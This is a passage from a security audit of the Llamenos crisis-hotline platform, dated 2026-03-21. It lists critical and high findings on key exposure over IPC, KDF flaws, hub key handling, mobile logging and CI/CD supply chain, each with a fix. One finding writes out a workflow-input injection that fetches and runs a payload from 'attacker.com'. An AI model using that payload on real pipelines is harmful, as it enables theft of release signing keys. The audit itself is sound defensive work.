> **HISTORICAL DOCUMENT**: This is a point-in-time snapshot from 2026-03-21. Findings reflect the codebase state at that date. Many issues have been remediated since. The crypto architecture has continued to evolve — see [Crypto Architecture](CRYPTO_ARCHITECTURE.md) for current primitives and protocols.

# Llamenos Platform Security Audit Report

**Audit Date**: 2026-03-21
**Scope**: Full platform — Rust crypto crate, Worker backend, Tauri desktop shell, iOS client, Android client, CI/CD pipeline
**Threat Model**: E2EE, zero-knowledge server, zero-trust. Adversaries include nation-states, right-wing groups, and private hacking firms.
**Classification**: CONFIDENTIAL — Restricted to security team

---

## 1. Executive Summary

This audit examined the complete Llamenos platform across six components. Findings are distributed as follows:

| Severity | Count | Components Affected |
|----------|-------|---------------------|
| CRITICAL | 17 | Crypto, Worker, Desktop, iOS/Android, CI/CD |
| HIGH | 28 | All components |
| MEDIUM | 13 | Crypto, Worker, Desktop, iOS/Android, CI/CD |
| **Total** | **58** | |

### Top Priority Issues

The following findings represent the highest-risk vulnerabilities and must be addressed before any production deployment:

1. **CRIT-D1 / CRIT-D2 / CRIT-D3 (Desktop)** — The nsec crosses into the webview via IPC responses and registered commands. This directly violates the platform's core architectural guarantee. Any XSS in a rendered call note or server-injected content exfiltrates the volunteer's nsec. Three separate command surfaces expose this.

2. **CRIT-CI1 (CI/CD)** — Workflow input is injected directly into shell commands, giving any repository contributor with `workflow` dispatch access the ability to exfiltrate `TAURI_SIGNING_PRIVATE_KEY`, `APPLE_CERTIFICATE`, and `APPLE_ID` from release runners.

3. **CRIT-C1 / CRIT-C3 (Crypto)** — HKDF uses a `None` salt (producing a fully deterministic PRK), and a KDF mismatch between `ffi.rs` and `provisioning.rs` means device linking either silently fails or is vulnerable to MITM.

4. **CRIT-W1 / CRIT-W2 (Worker)** — Twilio webhook hub is selected from an untrusted query parameter, enabling signature validation bypass. Volunteer pubkeys are accepted from URL params in callbacks rather than server-side state, allowing audit log poisoning and call ownership hijacking.

5. **CRIT-M3 (iOS/Android)** — An admin private key is hardcoded in source and in a comment that is not guarded by `#if DEBUG`. This key may appear in `.dSYM` symbol files uploaded to App Store Connect and crash reporters, and in git history.

---

## 2. CRITICAL Findings

### CI/CD

---

### CRIT-CI1 (CRITICAL): Workflow input injected into shell without environment variable indirection

**Component**: CI/CD — GitHub Actions
**File(s)**: `.github/workflows/tauri-release.yml:88-109`
**Description**: The expression `${{ github.event.inputs.version }}` is expanded directly into the shell script body before the shell interpreter sees it. GitHub Actions performs this substitution at YAML parse time, not at shell execution time, meaning arbitrary shell syntax in the input becomes part of the executed command.
**Impact**: Full runner compromise. The tauri-release runner holds `TAURI_SIGNING_PRIVATE_KEY`, `APPLE_CERTIFICATE`, `APPLE_ID`, and `APPLE_PASSWORD` in its environment. Exfiltration of the signing key allows permanently valid update binaries to be signed and delivered to all installed desktop clients.
**Exploit Scenario**: An actor with repository `write` access (or a compromised contributor account) triggers a `workflow_dispatch` event with `version: "1.0.0$(curl attacker.com/payload | bash)"`. The shell executes the injected command with full runner privileges during the build phase.
**Fix**: Pass the input through an environment variable (`env: INPUT_VERSION: ${{ github.event.inputs.version }}`), then reference `$INPUT_VERSION` in the script body. Validate the value against a strict semver regex before using it.

---

### CRIT-CI2 (CRITICAL): Production Dockerfile base images pinned to mutable tags

**Component**: CI/CD — Docker build
**File(s)**: `deploy/docker/Dockerfile:10,18`
**Description**: Both `FROM oven/bun:1 AS deps` and `FROM oven/bun:1-slim` use mutable tag references. `Dockerfile.build` (the reproducible build image) correctly uses a SHA-256 digest pin. The production image is inconsistent with the reproducibility guarantee.
**Impact**: A backdoored base image (via a compromised Docker Hub account or a supply-chain attack on the upstream image) runs with all application code, including E2EE note decryption and database access. The attack is invisible to source-level review.
**Exploit Scenario**: Attacker compromises the `oven/bun` Docker Hub account and pushes a backdoored image under the `1` and `1-slim` tags. Next production build pulls the malicious image. The backdoor exfiltrates `DATABASE_URL`, `SERVER_NOSTR_SECRET`, and all decrypted note keys processed in-memory.
**Fix**: Pin both `FROM` stages to the same verified SHA-256 digest used in `Dockerfile.build`. Update the digest on a planned cadence with explicit review.

---

### Crypto

---

### CRIT-C1 (CRITICAL): HKDF Extract uses `None` salt — fully deterministic PRK

**Component**: Crypto — ECIES key derivation
**File(s)**: `packages/crypto/src/ecies.rs:73-78`
**Description**: `derive_ecies_key_v2` calls `Hkdf::new(None, shared_x)`. Per RFC 5869, when salt is `None`, HKDF Extract substitutes a zero-filled block of `HashLen` bytes. The PRK becomes entirely a function of the shared ECDH x-coordinate with no additional entropy injection. There is no per-operation randomness contributed by the salt.
**Impact**: The security of all ECIES-wrapped key material (hub keys, note keys, message keys, wake keys) rests entirely on the entropy of the ephemeral keypair. Degraded PRK derivation reduces the effective security margin and contradicts the HKDF usage intent documented in the protocol spec.
**Exploit Scenario**: An adversary who can observe multiple wrapped envelopes sharing the same ephemeral key (e.g., due to an RNG fault) can directly correlate PRKs without the salt providing any break. Additionally, any future multi-target attack that recovers the ECDH shared secret for one pair directly recovers the symmetric key.
**Fix**: Use a stable, domain-specific static salt: `Hkdf::new(Some(b"llamenos:ecies:v2"), shared_x)`. Ensure this exact byte string is used consistently across the Rust crate, the WASM build, and all platform-specific crypto implementations.

---

### CRIT-C2 (CRITICAL): v1 legacy decryption path permanently active — version-sniffing oracle

**Component**: Crypto — ECIES versioning
**File(s)**: `packages/crypto/src/ecies.rs:218-236`
**Description**: `ecies_unwrap_key_versioned` detects the version by checking `data[0] == ECIES_VERSION_V2`. This is a content-sniffing heuristic, not a reliable wire-format field. Ciphertext whose first encrypted byte happens to be `0x02` will be misidentified as v2. The v1 path uses SHA-256 concatenation (no HKDF), while v2 uses HKDF. The project is pre-production with no legacy data.
**Impact**: The coexistence of two derivation paths with content-sniffing selection creates an oracle: an attacker who can influence the first byte of a ciphertext can force the server or client to attempt v1 derivation, leaking information about key material through timing or error differences.
**Exploit Scenario**: Attacker intercepts a v2 envelope and replaces the first byte with `0x01`. The library now applies v1 SHA-256 derivation to what was a v2 ciphertext. AEAD authentication fails but the attempt may leak timing information. Repeated toggling probes the boundary between derivation paths.
**Fix**: Remove `ecies_unwrap_key_versioned`, `derive_ecies_key_v1`, and all v1 code paths entirely. Per CLAUDE.md: "no legacy fallbacks" pre-production.

---

### CRIT-C3 (CRITICAL): Provisioning KDF mismatch between ffi.rs and provisioning.rs

**Component**: Crypto — Device provisioning
**File(s)**: `packages/crypto/src/ffi.rs:188-193`; `packages/crypto/src/provisioning.rs:81`
**Description**: `decrypt_with_shared_key_hex` (used by the mobile FFI layer) derives the provisioning symmetric key via `SHA-256(LABEL_DEVICE_PROVISION || shared_x)`. The canonical `derive_provisioning_key` in `provisioning.rs` uses `HKDF-SHA256(None, shared_x, LABEL_DEVICE_PROVISION)`. These two derivations produce different keys from the same ECDH input.
**Impact**: Device linking either silently fails (both sides cannot agree on a key, provisioning always errors) or one side decrypts garbage, which may be misinterpreted as success and result in an undetectable state divergence. In the worst case, if one path's output is partially predictable, a MITM positioned during provisioning can exploit the mismatch.
**Exploit Scenario**: An attacker who can observe the provisioning exchange can attempt decryption under both derivation schemes. If the ffi.rs path produces a weaker key (SHA-256 concat vs. HKDF), the attacker precomputes against the weaker derivation to recover the provisioned nsec.
**Fix**: Unify both paths to HKDF v2 with the same call signature. Audit the desktop `platform.ts` provisioning code to confirm it also matches. Add a cross-platform integration test that provisions a key pair across all three implementations (Rust, WASM, mobile FFI) and verifies round-trip.

---

### Hub Key / Multi-Hub

---

### CRIT-H1 (CRITICAL): `GET /api/hubs/:hubId/key` has no membership check

**Component**: Worker — Hub key endpoint
**File(s)**: `apps/worker/routes/hubs.ts:249-283`
**Description**: The hub key retrieval endpoint has no `requirePermission` middleware and no `hasHubAccess` inline check. The handler calls `getHubKeyEnvelopes(hubId)` with a caller-supplied `hubId` parameter without verifying that the authenticated user is a member of that hub. Every other hub-scoped route in the codebase applies both `requirePermission('hubs:read')` and an inline membership check.
**Impact**: Any authenticated user can probe hub existence and retrieve their own envelope (or confirm lack thereof) for any hub in the system. While the ECIES envelope prevents reading another user's key, an attacker can enumerate hub IDs and confirm organizational membership patterns — a significant privacy violation against the zero-knowledge requirement.
**Exploit Scenario**: A volunteer who is a member of Hub A authenticates and sends `GET /api/hubs/<hub-b-id>/key`. The server returns a 404 (no envelope) or an envelope for a hub they have no membership in. The 404 vs. 200 response confirms whether any member has been provisioned for that hub — leaking organizational structure.
**Fix**: Add `requirePermission('hubs:read')` middleware and an explicit `hasHubAccess` check (matching the pattern of all other hub-scoped routes) before calling `getHubKeyEnvelopes`.

---

### CRIT-H2 (CRITICAL): iOS hub switch does not invalidate relay connection or clear hub key

**Component**: iOS — Hub switching
**File(s)**: `apps/ios/Sources/ViewModels/HubManagementViewModel.swift:61-64`
**Description**: `switchHub(to:)` sets `activeHubSlug` and nothing else. The WebSocket connection to the old hub's relay remains open and authenticated. `serverEventKeyHex` from Hub A remains set on `WebSocketService`. The app does not disconnect, does not nil the key, does not reconnect to the new hub relay URL, and does not re-fetch `/api/auth/me` for the new hub context.
**Impact**: After switching to Hub B, all relay events received are still decrypted with Hub A's key. Hub B events that use Hub B's key cannot be decrypted. More critically, Hub A's relay key remains in memory and active — if Hub A and Hub B are separate organizations, Hub A traffic continues to be readable after the switch.
**Exploit Scenario**: A volunteer who works for two crisis organizations switches their app from Hub A (Organization A) to Hub B (Organization B). Hub A's relay stream continues to arrive and decrypt correctly, exposing Organization A's operational events to a context where Organization B's app session is active. If the device is compromised after the switch, Hub A key material is still in memory.
**Fix**: On hub switch, call WebSocket disconnect, nil `serverEventKeyHex`, reconnect using the new hub's relay URL from `HubConfig`, and re-fetch `/api/auth/me` to receive the correct hub-scoped key.

---

### CRIT-H3 (CRITICAL): Android hub switch is local-state-only — WebSocket and key not invalidated

**Component**: Android — Hub switching
**File(s)**: `apps/android/app/src/main/java/org/llamenos/hotline/ui/hubs/HubManagementViewModel.kt:120-122`
**Description**: `switchHub()` updates only `_uiState.copy(activeHubId = hubId)`. `WebSocketService` is never instructed to disconnect or reconnect. The singleton WebSocket stays connected to the previous hub's relay URL and retains the previous hub's `serverEventKeyHex`.
**Impact**: Identical to CRIT-H2 on Android. The previous hub's relay key and connection persist indefinitely after switching. On Android the singleton service pattern means the leaked state survives even app backgrounding.
**Exploit Scenario**: Same as CRIT-H2. Additionally, incoming real-time events for the new hub cannot be received or decrypted because the connection remains pointed at the old hub's relay URL.
**Fix**: `switchHub()` must invoke a full WebSocket disconnect/reconnect cycle with the new hub's relay URL, clear `serverEventKeyHex`, and re-authenticate to receive the new hub's key.

---

### Desktop

---

### CRIT-D1 (CRITICAL): `KeyPair` IPC response includes `secretKeyHex` and `nsec` in plaintext to the webview

**Component**: Desktop — Tauri IPC / Key management
**File(s)**: `packages/crypto/src/keys.rs:16-25`; `apps/desktop/src/lib.rs:175-176`; `src/client/routes/onboarding.tsx:135-141`; `src/client/components/setup/AdminBootstrap.tsx:132-138`
**Description**: The `KeyPair` struct serializes four fields over IPC: `secretKeyHex`, `publicKey`, `nsec`, and `npub`. Both `generate_keypair` and `key_pair_from_nsec` return the complete struct. In the webview, `kp.nsec` and `kp.secretKeyHex` are stored in React component state. This directly contradicts the platform's foundational security claim that the nsec never enters the webview.
**Impact**: Any XSS vulnerability in a rendered field (a crafted call note, an admin-supplied field name, a Nostr event content injection) can read React component state and exfiltrate the volunteer's nsec. Once exfiltrated, the nsec provides permanent access to all encrypted notes and Nostr identity.
**Exploit Scenario**: An attacker with the ability to influence any rendered string (call note, volunteer name, hub description) injects a `<script>` or uses a DOM-based XSS vector. The script reads `window.__REACT_FIBER__` or DevTools-equivalent introspection to extract `kp.nsec` from component state and exfiltrates it via a WebSocket or fetch to an attacker endpoint.
**Fix**: `generate_keypair` returns only `{ publicKey, npub }`. Key generation, PIN encryption, and CryptoState loading happen entirely in Rust in a single atomic command. `key_pair_from_nsec` is replaced with a command that accepts the nsec string on the Rust side, validates it, loads it into CryptoState, and returns only the pubkey. The nsec must never cross the IPC boundary outbound.

---

### CRIT-D2 (CRITICAL): `get_nsec_from_state` returns raw nsec bech32 to the webview

**Component**: Desktop — Tauri IPC / Provisioning
**File(s)**: `apps/desktop/src/crypto.rs:419-434`; `apps/desktop/isolation/index.html:43`; `src/client/lib/platform.ts:594-601`
**Description**: `get_nsec_from_state` decodes the secret key from CryptoState and returns a `nsec1...` bech32 string over IPC to the webview. This command is registered in `generate_handler![]` and explicitly allowlisted in the isolation script. The corresponding function in `platform.ts` is marked `@deprecated` with the comment "this leaks the nsec into JS" — yet it remains wired in and accessible.
**Impact**: The `@deprecated` annotation is documentation, not enforcement. The command is live and callable. Any XSS occurring during the provisioning flow can invoke this command and receive the raw nsec. Since provisioning is one of the first things a new volunteer does, this window may be wide open on first launch.
**Exploit Scenario**: An attacker who can inject content before the provisioning flow completes (e.g., via a malicious hub URL or a compromised HTTPS response) triggers `get_nsec_from_state` through the allowlisted isolation script. The full nsec is returned as a JavaScript string.
**Fix**: Remove `get_nsec_from_state` from `generate_handler![]` and from the isolation allowlist. Delete the `@deprecated` function in `platform.ts`. All provisioning flows use `encrypt_nsec_for_provisioning` exclusively, which handles the cross-device transfer without ever materializing the nsec in JS.

---

### CRIT-D3 (CRITICAL): `create_auth_token` accepts raw `secret_key_hex` from the webview and remains registered

**Component**: Desktop — Tauri IPC / Authentication
**File(s)**: `apps/desktop/src/crypto.rs:562-571`; `apps/desktop/src/lib.rs:174`; `apps/desktop/isolation/index.html:51`
**Description**: `create_auth_token` accepts `secret_key_hex: String` from the webview for signing. Per an inline comment, stateless commands were supposed to be deregistered (Epic 257 C4), but this command is explicitly carved out. It remains in `generate_handler![]` and in the isolation allowlist. The preferred successor `create_auth_token_from_state` exists and should be the only signing command.
**Impact**: Any code path or injection that can invoke IPC commands can pass an arbitrary secret key to produce a validly signed auth token for any Nostr identity, including admins. This is a privilege escalation vector — an attacker does not need to exfiltrate the nsec; they only need to invoke this command with a known key.
**Exploit Scenario**: An attacker who has obtained an admin's `secret_key_hex` via any means (git history, CRIT-M3, CRIT-D1) and achieves JS execution in the webview calls `create_auth_token` with the admin key to produce a valid session token and authenticate as admin.
**Fix**: Remove `create_auth_token` from `generate_handler![]` and the isolation allowlist. The sign-in flow must pass the nsec to `import_key_to_state` first, then invoke `create_auth_token_from_state` for all signing operations.

---

### CRIT-D4 (CRITICAL): Updater public key is a literal placeholder — signature verification non-functional

**Component**: Desktop — Tauri auto-updater
**File(s)**: `apps/desktop/tauri.conf.json:70`
**Description**: The `pubkey` field in the updater configuration contains the string `"REPLACE_WITH_PUBKEY_FROM_TAURI_SIGNER_GENERATE"`. The Tauri updater validates update payloads against this key. With a non-functional or unparseable key, the updater either rejects all updates or, depending on Tauri's error handling, silently skips signature verification.
**Impact**: If the updater skips verification on parse failure, a MITM between the app and the update endpoint can serve an arbitrary binary to all installed desktop clients. Given the self-hosted deployment model and the volunteer population, this is a realistic nation-state attack vector.
**Exploit Scenario**: An adversary who can intercept traffic between a volunteer's machine and the update endpoint (corporate firewall, ISP-level interception, DNS hijack) serves a backdoored Tauri binary. The app installs and executes it. The binary exfiltrates the Stronghold-protected nsec at next unlock.
**Fix**: Generate a real Ed25519 signing key with `tauri signer generate`. Store the private key in a secrets manager (not in the repository). Place the private key only in the release CI pipeline as a secret. Commit only the public key to `tauri.conf.json`.

---

### iOS / Android

---

### CRIT-M1 (CRITICAL): Decrypted push payload logged in plaintext with no `#if DEBUG` guard

**Component**: iOS — Push notification handling
**File(s)**: `apps/ios/Sources/App/LlamenosApp.swift:244`
**Description**: A `print()` statement logs the first 80 characters of the decrypted APNs wake payload — including `callId`, `shiftId`, `type`, and `message` — to the iOS system console in production builds. There is no `#if DEBUG` guard.
**Impact**: The iOS system console is readable by any process sharing the same App ID in development, by any root process on a jailbroken device, and by anyone with physical USB access using `idevicesyslog`. This exposes real-time operational data about incoming crisis calls — the precise information a threat actor needs to identify and target callers or intercept calls.
**Exploit Scenario**: An adversary with USB access to a volunteer's device (e.g., at a border crossing, during a device seizure) runs `idevicesyslog` and captures a log stream containing decrypted call payloads, including call IDs and shift context, in real time.
**Fix**: Remove the `print` statement entirely, or replace it with `os_log` at `.private` privacy level guarded by `#if DEBUG`.

---

### CRIT-M2 (CRITICAL): Android crash reporter silently falls back to plaintext `SharedPreferences`

**Component**: Android — Crash reporting
**File(s)**: `apps/android/app/src/main/java/org/llamenos/hotline/CrashReporter.kt:60-63`
**Description**: When `EncryptedSharedPreferences` initialization fails, `CrashReporter` silently falls back to `context.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)`. This stores the Sentry DSN in plaintext on disk. The Sentry DSN provides write access to the crash reporting endpoint and reveals the self-hosted infrastructure address.
**Impact**: Any failure of the Android Keystore (e.g., device reset, hardware failure, rooted device state) silently downgrades to plaintext storage. The Sentry DSN in plaintext is readable via ADB backup (on unprotected devices) or root access. Infrastructure endpoint disclosure assists reconnaissance.
**Exploit Scenario**: An attacker who roots a seized volunteer device (or exploits a Keystore bypass, which have occurred on older Android versions) finds the Sentry DSN in plaintext SharedPreferences. They use write access to the crash endpoint to inject false crash reports, masking real errors or exfiltrating crash metadata.
**Fix**: Remove the fallback entirely. If `EncryptedSharedPreferences` is unavailable, disable crash reporting for the session and log the failure locally only. Do not persist sensitive configuration in unencrypted storage under any circumstance.

---

### CRIT-M3 (CRITICAL): Admin private key hardcoded in source code and in source comments

**Component**: iOS — Source code / CryptoService
**File(s)**: `apps/ios/Sources/App/AppState.swift:208`; `apps/ios/Sources/Services/CryptoService.swift:337-338`
**Description**: A raw admin secret key hex string appears in `AppState.swift` inside a `#if DEBUG` block. The same key value appears in a doc comment in `CryptoService.swift` that is NOT guarded by any conditional compilation directive. Source comments are stripped from compiled binaries but are included in `.dSYM` symbol files uploaded to App Store Connect and crash reporting services such as Sentry/GlitchTip. The key also exists in git history.
**Impact**: Full admin access to any deployment that used this key. Admin can read all volunteer notes, audit logs, active calls, and billing data. Admin can manage volunteers and ban lists. The key is irrevocably compromised via git history regardless of source removal.
**Exploit Scenario**: An adversary with access to the `.dSYM` files (obtainable from App Store Connect for any app distributed via TestFlight), or with access to the git repository history, extracts the admin secret key. They use it to authenticate as admin against any deployment that has not rotated this key, gaining complete access to the platform.
**Fix**: Remove all raw private key values from source and comments immediately. Audit git history with `git log --all -S "<key_value>" --source --all`. If this key has ever been used in any deployed environment, rotate it immediately and revoke all sessions signed with it. Replace with references to external environment files.

---

## 3. HIGH Findings

### CI/CD

---

### HIGH-CI1 (HIGH): `cargo install cargo-ndk` without `--locked`

**Component**: CI/CD — Android build
**File(s)**: `.github/workflows/mobile-release.yml:57`
**Description**: `cargo install cargo-ndk` resolves the latest compatible dependency versions at runtime, bypassing `Cargo.lock`. Every other `cargo install` in the codebase uses `--locked`.
**Impact**: A compromised crate dependency can be injected silently into the Android JNI build toolchain. The resulting `.so` files are embedded in the APK and execute on volunteer devices.
**Fix**: `cargo install cargo-ndk --locked`

---

### HIGH-CI2 (HIGH): strfry relay image not pinned to digest in production Docker Compose

**Component**: CI/CD — Docker Compose / Nostr relay
**File(s)**: `deploy/docker/docker-compose.yml:147`
**Description**: `image: dockurr/strfry:1.0.1` is tag-only for a non-official image. The comment acknowledges the TODO. strfry handles all real-time hub events including key distribution.
**Impact**: A compromised or tag-replaced image can intercept all encrypted Nostr relay traffic, corrupt key distribution events, or silently drop events to cause denial of service for on-shift volunteers.
**Fix**: Pull the image, record the digest, and pin: `image: dockurr/strfry@sha256:<digest>`. Verify the publisher's identity before trusting.

---

### HIGH-CI3 (HIGH): Whisper transcription image not pinned to digest

**Component**: CI/CD — Docker Compose / transcription
**File(s)**: `deploy/docker/docker-compose.yml:167`; `deploy/helm/llamenos/values.yaml:56`
**Description**: `image: fedirz/faster-whisper-server:0.4.1` is tag-only. The comment acknowledges the TODO. Whisper processes live audio from crisis calls.
**Impact**: A compromised Whisper image has access to raw call audio, enabling exfiltration of caller voice data and conversation content in real time.
**Fix**: Pin by digest in both Docker Compose and Helm values after verifying the image.

---

### HIGH-CI4 (HIGH): `bun install` without `--frozen-lockfile` in load test workflow

**Component**: CI/CD — Load testing
**File(s)**: `.github/workflows/load-test.yml:59`
**Description**: `run: bun install` without `--frozen-lockfile` can update `bun.lockb` during CI execution, silently introducing unreviewed dependency changes. All other workflows use `--frozen-lockfile`.
**Fix**: `bun install --frozen-lockfile`

---

### HIGH-CI5 (HIGH): Release workflows grant `contents:write` at workflow level

**Component**: CI/CD — GitHub Actions permissions
**File(s)**: `.github/workflows/tauri-release.yml:20-21`; `.github/workflows/mobile-release.yml`
**Description**: `permissions: contents: write` is declared at the workflow level. All jobs in the matrix, including cross-platform build jobs that do not need write access, inherit this permission. The principle of least privilege requires per-job scoping.
**Impact**: A compromised build job (via a malicious action or supply-chain attack in any step) can write to the repository — tagging releases, modifying workflow files, or pushing commits — under the elevated permission context.
**Fix**: Remove top-level permissions. Add per-job scoped permissions: build jobs receive `contents: read`, only the release/publish job receives `contents: write`.

---

### HIGH-CI6 (HIGH): RustFS binary downloaded and executed without checksum verification in iOS CI

**Component**: CI/CD — iOS build / RustFS
**File(s)**: `.github/workflows/ci.yml:571-573`
**Description**: The workflow downloads the RustFS binary via `curl` and immediately marks it executable and runs it. No SHA-256 checksum verification is performed. The git-cliff download in the same workflow correctly verifies its checksum immediately after download.
**Impact**: A MITM between the CI runner and `dl.min.io` (or a DNS-level redirect) can serve a malicious binary that executes on the macOS runner with iOS build secrets in scope, including code signing certificates and provisioning profile passphrases.
**Fix**: After the `curl` download, verify the binary's SHA-256 against a hardcoded or securely fetched expected checksum before executing it. Alternatively, use the Docker RustFS image for a reproducible, digest-pinned alternative.

---

### HIGH-CI7 (HIGH): Committed `.env` files with real-looking secrets

**Component**: CI/CD — Secret management
**File(s)**: `deploy/docker/.env`; `deploy/docker/.env.shard-0` through `.env.shard-3`
**Description**: Files on disk contain apparent real hex secrets (`HMAC_SECRET`, `SERVER_NOSTR_SECRET`). `.gitignore` excludes these patterns but the files exist on disk and may have been committed previously.
**Impact**: If any of these secrets appear in git history, all data encrypted or authenticated with them is compromised. `SERVER_NOSTR_SECRET` is the root secret from which the server's Nostr keypair is derived via HKDF. `HMAC_SECRET` authenticates API tokens.
**Exploit Scenario**: An adversary with read access to git history (any past clone, GitHub archive request, or source code leak) extracts `SERVER_NOSTR_SECRET` and derives the server's Nostr private key, enabling them to sign events as the server and decrypt all hub key distribution events.
**Fix**: Run `git log --all --full-history -- 'deploy/docker/.env*'` immediately. If any of these files appear in history, rotate every secret contained in them. Add a pre-commit hook and CI check to prevent future commits of `.env` files.

---

### Crypto

---

### HIGH-C1 (HIGH): `secret_key_hex` not zeroized — plain `String` in `KeyPair` struct

**Component**: Crypto — Key material lifecycle
**File(s)**: `packages/crypto/src/keys.rs:33,70,87`
**Description**: `KeyPair.secret_key_hex` is a plain Rust `String`. `sk_bytes` (a `GenericArray`) and `data` (raw 32-byte secret) are dropped without zeroization. Rust's allocator does not zero memory on drop. Crash dumps, memory forensics, or core dumps will contain the raw nsec.
**Impact**: A crash or controlled memory dump at any point while a `KeyPair` is in scope recovers the volunteer's nsec. On Linux systems, `/proc/<pid>/mem` access by a privileged process achieves the same result.
**Fix**: Wrap `secret_key_hex` in `Zeroizing<String>`. Zeroize all intermediate byte buffers (`sk_bytes`, `data`) immediately after their last use, and rely on `ZeroizeOnDrop` for struct-level cleanup.

---

### HIGH-C2 (HIGH): Note and message key not `ZeroizeOnDrop` — leaked on panic

**Component**: Crypto — Note encryption
**File(s)**: `packages/crypto/src/encryption.rs:73-91`
**Description**: `note_key` is allocated as a plain `[u8; 32]`. An explicit `note_key.zeroize()` is called on line 86, but fallible operations (`admin_envelopes?`) execute after the zeroize call. If a panic occurs between key creation and the zeroize call, or if the function returns early via `?` on a preceding line that was later refactored, the key survives in memory.
**Impact**: Per-note forward secrecy is undermined if note keys are recoverable from process memory. A crash during note encryption leaves the note key in heap memory until the allocator reuses that region.
**Fix**: `let mut note_key = Zeroizing::new(random_bytes_32());`. The `ZeroizeOnDrop` implementation ensures cleanup on all exit paths including panics, without relying on manually ordered explicit calls.

---

### HIGH-C3 (HIGH): UniFFI exports `secret_key_hex` as plain string across the FFI boundary

**Component**: Crypto — Mobile FFI
**File(s)**: `packages/crypto/src/keys.rs:15-25`
**Description**: When the `mobile` feature is enabled, `KeyPair` derives `uniffi::Record`, causing UniFFI to serialize the struct — including `secret_key_hex` — to Swift `String` and Kotlin `String`. Both are immutable, heap-allocated, potentially interned, and not zeroizable. Crash reporters (Sentry, GlitchTip, Firebase Crashlytics) may capture string values from memory during crash analysis. CLAUDE.md explicitly requires that `nsecHex` is private and never leaves the service layer.
**Impact**: Any crash during or after a function that returns `KeyPair` over FFI may transmit the nsec to the crash reporting endpoint. The GlitchTip instance is self-hosted, but the principle applies to any reporter configured in debug or beta builds.
**Fix**: Remove `secret_key_hex` (and any other key material fields) from the `KeyPair` `uniffi::Record` when `feature = "mobile"`. Provide all key operations through stateful FFI methods that operate on CryptoState without returning key material as struct fields.

---

### HIGH-C4 (HIGH): `derive_kek_hex` FFI export bypasses PIN validation

**Component**: Crypto — PIN-based key derivation
**File(s)**: `packages/crypto/src/ffi.rs:115-121`; `packages/crypto/src/encryption.rs:439`
**Description**: `derive_kek_hex` is exported via `#[uniffi::export]` and accepts any string as a PIN with no length or format validation. `is_valid_pin` is called only within `encrypt_with_pin`. A mobile caller can invoke `derive_kek_hex` directly with an empty string, a single character, or any low-entropy input, producing a severely weakened key encryption key.
**Impact**: If a developer or a confused client implementation calls `derive_kek_hex` with a short PIN and uses the result to wrap key material, that material has substantially reduced protection. An adversary who obtains the wrapped key can brute-force the short PIN offline.
**Fix**: Call `is_valid_pin` at the entry of `derive_kek_hex` and return an error if validation fails. Alternatively, remove the direct FFI export and require all PIN-based derivation to go through `encrypt_with_pin` / `decrypt_with_pin`, which enforce validation.

---

### HIGH-C5 (HIGH): `get_nsec()` in `wasm.rs` returns raw nsec as an unzeroizable JS string

**Component**: Crypto — WASM
**File(s)**: `packages/crypto/src/wasm.rs:494-507`
**Description**: The `#[wasm_bindgen]` export `get_nsec()` returns the raw nsec as a JavaScript string primitive. JavaScript strings are immutable, unzeroizable, potentially retained by V8's string intern table, and visible to browser devtools. The comment in source states this is used "ONLY for device provisioning and backup," but `encrypt_nsec_for_provisioning` already handles provisioning without materializing the nsec in JS.
**Impact**: Any JavaScript code running in the same context (browser extension, injected script, compromised dependency) can call `get_nsec()` and receive the raw nsec. V8 may retain the string across garbage collection cycles.
**Fix**: Remove `get_nsec` entirely. Route all provisioning through `encrypt_nsec_for_provisioning`, which produces an encrypted payload without exposing the plaintext nsec to JavaScript.

---

### Hub Key / Multi-Hub

---

### HIGH-H1 (HIGH): Hub key ECIES unwrap absent on iOS — no client-side verification

**Component**: iOS — Hub key loading
**File(s)**: `apps/ios/Sources/App/AppState.swift:372`
**Description**: No iOS code calls `GET /api/hubs/:hubId/key`, performs ECIES unwrap of the returned envelope, and sets `serverEventKeyHex` from the result. iOS receives `serverEventKeyHex` solely via `GET /api/auth/me`. The system relies entirely on the server delivering the correct key; there is no client-side verification that the key corresponds to the current hub or that the client is the intended recipient.
**Impact**: If the server returns the wrong hub's key (e.g., due to a session context bug or a targeted misconfiguration), iOS accepts and uses it without detecting the mismatch. The zero-knowledge guarantee requires the client to be able to independently verify key material.
**Fix**: Verify that `/api/auth/me` is hub-scoped and returns keys specific to the active hub. If not, implement client-side ECIES unwrap: fetch the hub key envelope, unwrap with the volunteer's private key, compare to the key received via `auth/me`. This provides independent verification.

---

### HIGH-H2 (HIGH): Android push notifications carry no hub attribution

**Component**: Android — Push notifications / hub routing
**File(s)**: `apps/android/app/src/main/java/org/llamenos/hotline/service/PushService.kt:89-134`
**Description**: `onMessageReceived` dispatches on plaintext `data["type"]` with no hub-scope check. The wake payload decryption uses a device-specific wake key rather than a hub-specific one. A volunteer who is a member of multiple hubs receives push notifications for all hubs without differentiation.
**Impact**: A volunteer actively handling a Hub A call may receive and be presented with a ringing call from Hub B simultaneously, with no indication of which hub it belongs to. More critically, there is no mechanism to confirm the ringing call belongs to the hub the volunteer is currently authenticated against.
**Fix**: Include a `hubId` field in the encrypted wake payload. In `PushService`, after wake payload decryption, verify that the `hubId` matches the currently active hub before surfacing the call to the UI. Route background hub-specific events accordingly.

---

### HIGH-H3 (HIGH): Active hub slug stored in `UserDefaults` instead of Keychain

**Component**: iOS — Hub state persistence
**File(s)**: `apps/ios/Sources/ViewModels/HubManagementViewModel.swift:20-28`
**Description**: `UserDefaults.standard.set(slug, forKey: "activeHubSlug")` stores the active hub identifier in `UserDefaults`, which is not excluded from iCloud backups by default, is observable by MDM profiles, and does not benefit from Keychain access control attributes. The hub URL is already stored in `KeychainService`.
**Impact**: The hub slug identifies which crisis organization a volunteer works with. Under the adversarial threat model, organizational membership is sensitive metadata. iCloud backup exposure or MDM observation leaks this affiliation to cloud providers or device management operators.
**Fix**: Store `activeHubSlug` in `KeychainService` with the same accessibility settings used for other operational data, consistent with how the hub URL is handled.

---

### Worker

---

### HIGH-W1 (HIGH): `serverEventKeyHex` returned to all authenticated users regardless of role

**Component**: Worker — Authentication / Nostr relay key
**File(s)**: `apps/worker/routes/auth.ts:153-155,173`
**Description**: `serverEventKeyHex` is derived deterministically from `SERVER_NOSTR_SECRET` and returned in the `/api/auth/me` response to every authenticated user. This is a single global key for all hubs. Any compromised volunteer session token — regardless of the volunteer's hub, role, or active status — yields the key to decrypt all hub relay traffic.
**Impact**: Compromise of any single low-privilege account gives an adversary the ability to decrypt all past and future strfry relay events across all hubs. This key cannot be rotated without re-provisioning all clients simultaneously. One key protects all organizational communications.
